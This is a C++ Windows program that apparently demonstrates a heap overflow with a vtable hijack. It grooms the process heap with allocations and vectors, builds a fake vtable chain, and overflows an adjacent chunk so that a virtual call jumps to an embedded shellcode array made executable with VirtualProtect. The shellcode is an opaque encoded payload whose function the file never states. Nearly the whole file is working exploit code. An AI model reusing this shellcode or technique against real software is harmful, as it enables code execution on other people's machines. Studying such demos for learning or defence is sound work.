#include <Windows.h>
#include <stdio.h>
#include <vector>
using namespace std;

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

// Object with Virtual Function 
// Used to create entry we overflow in exploit
class SomeObject {
public:
    void function1() {
    };
    virtual void virtualFunction() {
        printf("test\n");
    };
};


// Structure to hold values (Adjacent in memory)
// To emulate a entry in the VFTable
struct vfHierarchy {
    int veax;
    int vedx;
    int vecx;
};

// Shellcode
unsigned char SHELL[] = 
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x76\xa4\xd6\xb6\x83\xee\xfc\xe2\xf4\x8a\x4c\x54\xb6"
"\x76\xa4\xb6\x3f\x93\x95\x16\xd2\xfd\xf4\xe6\x3d\x24\xa8"
"\x5d\xe4\x62\x2f\xa4\x9e\x79\x13\x9c\x90\x47\x5b\x7a\x8a"
"\x17\xd8\xd4\x9a\x56\x65\x19\xbb\x77\x63\x34\x44\x24\xf3"
"\x5d\xe4\x66\x2f\x9c\x8a\xfd\xe8\xc7\xce\x95\xec\xd7\x67"
"\x27\x2f\x8f\x96\x77\x77\x5d\xff\x6e\x47\xec\xff\xfd\x90"
"\x5d\xb7\xa0\x95\x29\x1a\xb7\x6b\xdb\xb7\xb1\x9c\x36\xc3"
"\x80\xa7\xab\x4e\x4d\xd9\xf2\xc3\x92\xfc\x5d\xee\x52\xa5"
"\x05\xd0\xfd\xa8\x9d\x3d\x2e\xb8\xd7\x65\xfd\xa0\x5d\xb7"
"\xa6\x2d\x92\x92\x52\xff\x8d\xd7\x2f\xfe\x87\x49\x96\xfb"
"\x89\xec\xfd\xb6\x3d\x3b\x2b\xcc\xe5\x84\x76\xa4\xbe\xc1"
"\x05\x96\x89\xe2\x1e\xe8\xa1\x90\x71\x5b\x03\x0e\xe6\xa5"
"\xd6\xb6\x5f\x60\x82\xe6\x1e\x8d\x56\xdd\x76\x5b\x03\xe6"
"\x26\xf4\x86\xf6\x26\xe4\x86\xde\x9c\xab\x09\x56\x89\x71"
"\x41\xdc\x73\xcc\x16\x1e\x76\x38\xbe\xb4\x76\xbb\x46\x3f"
"\x90\xce\xc6\xe0\x21\xcc\x4f\x13\x02\xc5\x29\x63\xf3\x64"
"\xa2\xba\x89\xea\xde\xc3\x9a\xcc\x26\x03\xd4\xf2\x29\x63"
"\x1e\xc7\xbb\xd2\x76\x2d\x35\xe1\x21\xf3\xe7\x40\x1c\xb6"
"\x8f\xe0\x94\x59\xb0\x71\x32\x80\xea\xb7\x77\x29\x92\x92"
"\x66\x62\xd6\xf2\x22\xf4\x80\xe0\x20\xe2\x80\xf8\x20\xf2"
"\x85\xe0\x1e\xdd\x1a\x89\xf0\x5b\x03\x3f\x96\xea\x80\xf0"
"\x89\x94\xbe\xbe\xf1\xb9\xb6\x49\xa3\x1f\x26\x03\xd4\xf2"
"\xbe\x10\xe3\x19\x4b\x49\xa3\x98\xd0\xca\x7c\x24\x2d\x56"
"\x03\xa1\x6d\xf1\x65\xd6\xb9\xdc\x76\xf7\x29\x63";

int main(int args, char** argv) {

    // Initial size of Vector (40 elements)
    int vectorSize = 40;
    // Heap Handle
    HANDLE hChunk;
    // Array of non LFH Allocations
    void* allocations[ALLOC_COUNT];
    // Objects to allocate (Make pointers to them)
    SomeObject* objects[5];
    // Allocate Object
    SomeObject* obj = new SomeObject();
    // Print address of Object
    printf("SomeObject address : 0x%08x\n", obj);

    // Get the handle for the default HEAP of the process.
    HANDLE defaultHeap = GetProcessHeap();

    // Allocate 10 objections (Do not invoke LFH)
    for (int i = 0; i < ALLOC_COUNT; i++) {
        hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
        memset(hChunk, 'A', CHUNK_SIZE);
        allocations[i] = hChunk;
        printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
    }

    // Free Chunk 6
    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[6]);
    // Allocate a number of Vectors who's elements are stored 
    // on the heap, hope one is allocated in the hole we 
    // created
    vector<SomeObject*> v1(vectorSize, obj);
    vector<SomeObject*> v2(vectorSize, obj);
    vector<SomeObject*> v3(vectorSize, obj);
    vector<SomeObject*> v4(vectorSize, obj);
    vector<SomeObject*> v5(vectorSize, obj);
    vector<SomeObject*> v6(vectorSize, obj);
    vector<SomeObject*> v7(vectorSize, obj);
    vector<SomeObject*> v8(vectorSize, obj);
    vector<SomeObject*> v9(vectorSize, obj);
    vector<SomeObject*> v10(vectorSize, obj);

    // Debug Info
    printf("vector : 0x%08x\n", v1);
    printf("vector : 0x%08x\n", v2);
    printf("vector : 0x%08x\n", v3);
    printf("vector : 0x%08x\n", v4);
    printf("vector : 0x%08x\n", v5);
    printf("vector : 0x%08x\n", v6);
    printf("vector : 0x%08x\n", v7);
    printf("vector : 0x%08x\n", v8);
    printf("vector : 0x%08x\n", v9);
    printf("vector : 0x%08x\n", v10);
	
	// Mark the shell code as executable 
	DWORD oldProtect;
	VirtualProtect(SHELL, sizeof(SHELL), PAGE_EXECUTE_READWRITE, &oldProtect);

	
    /*--- Attack Code ---*/
    // A struct for saving   pointers which mimics the access of virtual function (object -> vtable -> vf code)
    vfHierarchy v = { (int)SHELL };     // veax = pointer to SHELL/Code to Execute 
    v.vedx = (int)&v;                   // vedx = pointer to veax 
    v.vecx = (int)&v + 4;               // vecx = pointer to vedx 
    
    printf("Shellcode address : 0x%08x and is stored as 0x%08x in the VTable Emulated Object\n", (int)SHELL, v.veax);
    //printf("Function address : 0x%08x\n", v.veax);
    printf("Vtable address : 0x%08x\n", v.vedx);
    printf("Object address : 0x%08x\n", v.vecx);

    char evilString[445];
    sprintf(evilString, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCDDDD%c%c%c%cefghijklmnopqrstuvwxyzABCD", (char)v.vecx, (char)((int)v.vecx >> 8), (char)((int)v.vecx >> 16), (char)((int)v.vecx >> 24));
    printf("%s",evilString);

    //memset(allocations[5], 'B', CHUNK_SIZE + 8 + 32);
    memcpy(allocations[5], evilString, sizeof(evilString));
	system("PAUSE");
    printf("====================================\n");
    printf("After heap overflow, call v1[0]\n");
    printf("====================================\n");
    v1.at(0)->virtualFunction();
    system("PAUSE");
    return 0;
}